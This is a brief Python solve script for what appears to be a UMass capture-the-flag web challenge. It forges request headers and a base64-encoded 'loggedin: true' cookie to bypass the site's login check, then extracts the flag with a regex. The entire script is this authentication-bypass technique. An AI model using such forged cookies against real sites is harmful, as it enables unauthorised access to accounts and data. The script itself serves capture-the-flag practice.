#!/usr/bin/env python3
import requests, re

URL = "http://holesomebirthdayparty.ctf.umasscybersec.org/"
HEADERS = {
    "Date": "Sat, 14 Jul 2024 23:25:28 GMT",
    "User-Agent" : "Bikini Bottom",
    "Accept-Language": "fr-CH",
    "Cookie" : "flavor=chocolate_chip; Login=eyJsb2dnZWRpbiI6IHRydWV9Cg=="
}

r = requests.get(URL, headers=HEADERS)
print(re.findall(r"UMASS\{.*\}", r.text)[0])